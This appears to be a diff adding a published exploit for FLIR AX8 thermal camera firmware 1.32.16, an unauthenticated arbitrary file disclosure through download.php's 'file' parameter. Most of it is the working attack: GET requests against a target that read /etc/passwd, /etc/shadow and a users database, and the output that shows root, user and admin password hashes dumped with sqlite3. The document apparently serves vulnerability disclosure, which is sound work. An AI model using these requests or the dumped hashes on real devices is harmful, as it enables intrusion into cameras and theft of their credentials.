@@ -1,0 +1,92 @@
+# Exploit Title: FLIR AX8 Thermal Camera 1.32.16 - Arbitrary File Disclosure
+# Auhor: Gjoko 'LiquidWorm' Krstic
+# Date: 2018-10-14
+# Vendor: FLIR Systems, Inc.
+# Product web page: https://www.flir.com
+# Affected version: Firmware: 1.32.16, 1.17.13
+# OS: neco_v1.8-0-g7ffe5b3
+# Hardware: Flir Systems Neco Board
+# Tested on: GNU/Linux 3.0.35-flir+gfd883a0 (armv7l), lighttpd/1.4.33, PHP/5.4.14
+# References: 
+# Advisory ID: ZSL-2018-5493
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5493.php
+
+# Desc: The FLIR AX8 thermal sensor camera suffers from an unauthenticated arbitrary 
+# file disclosure vulnerability. Input passed via the 'file' parameter in download.php
+# is not properly verified before being used to download config files. This can be
+# exploited to disclose the contents of arbitrary files via absolute path.
+
+# PoC
+# 1. GET http://TARGET/download.php?file=/etc/passwd HTTP/1.1
+
+root:x:0:0:root:/home/root:/bin/sh
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+messagebus:x:999:998::/var/lib/dbus:/bin/false
+fliruser:x:1000:1000::/home/fliruser:/bin/sh
+xuser:x:1001:1001::/home/xuser:/bin/sh
+sshd:x:998:995::/var/run/sshd:/bin/false
+avahi:x:997:994::/var/run/avahi-daemon:/bin/false
+avahi-autoipd:x:996:993:Avahi autoip daemon:/var/run/avahi-autoipd:/bin/false
+
+# 2. GET http://TARGET/download.php?file=/etc/shadow HTTP/1.1
+
+root:qA7LRQDa1amZM:17339:0:99999:7:::
+daemon:*:17339:0:99999:7:::
+bin:*:17339:0:99999:7:::
+sys:*:17339:0:99999:7:::
+sync:*:17339:0:99999:7:::
+games:*:17339:0:99999:7:::
+man:*:17339:0:99999:7:::
+lp:*:17339:0:99999:7:::
+mail:*:17339:0:99999:7:::
+news:*:17339:0:99999:7:::
+uucp:*:17339:0:99999:7:::
+proxy:*:17339:0:99999:7:::
+www-data:*:17339:0:99999:7:::
+backup:*:17339:0:99999:7:::
+list:*:17339:0:99999:7:::
+irc:*:17339:0:99999:7:::
+gnats:*:17339:0:99999:7:::
+nobody:*:17339:0:99999:7:::
+messagebus:!:17339:0:99999:7:::
+fliruser:m1iiKYIJr63u2:17339:0:99999:7:::
+xuser:!:17339:0:99999:7:::
+sshd:!:17339:0:99999:7:::
+avahi:!:17339:0:99999:7:::
+avahi-autoipd:!:17339:0:99999:7:::
+
+# 3. GET http://TARGET/download.php?file=/FLIR/system/profile.d/userPreset.tar HTTP/1.1
+#    GET http://TARGET/download.php?file=/FLIR/usr/www/FLIR/db/users.db HTTP/1.1
+
+lqwrm@metalgear:~/$ sqlite3 users.db 
+SQLite version 3.11.0 2016-02-15 17:29:24
+Enter ".help" for usage hints.
+sqlite> .tables
+roles  users
+sqlite> select * from roles;
+1|admin
+2|user
+3|viewer
+sqlite> select * from users;
+1|admin||$2y$10$/J/KDhh0.UDg5pbwtPG9B.W2gEWrS36qHji1scgxO7uiTk1GuAa.K|1
+2|user||$2y$10$O5Ybml6qN9caTjezQR0f8.z230PavQYUwmZCzMVxL6BMeNvLWEr9q|2
+3|viewer||$2y$10$lxA0o325EuUtVAaTItBt.OSpZSfxIrT56ntm7326FQ/fTBc0ODWqq|3
+4|service||$2y$10$syAL0yMLBfN/8.sciVnCE.kBto6mtVvjrmyhPQAo7oV3rq8X8pBke|4
+5|developer||$2y$10$LBNcMBC/Bn3VVnhlI1j7huOZ.UOykGaq3VZ.YAgu0mAZXAQ8q36uG|5
+sqlite>.q
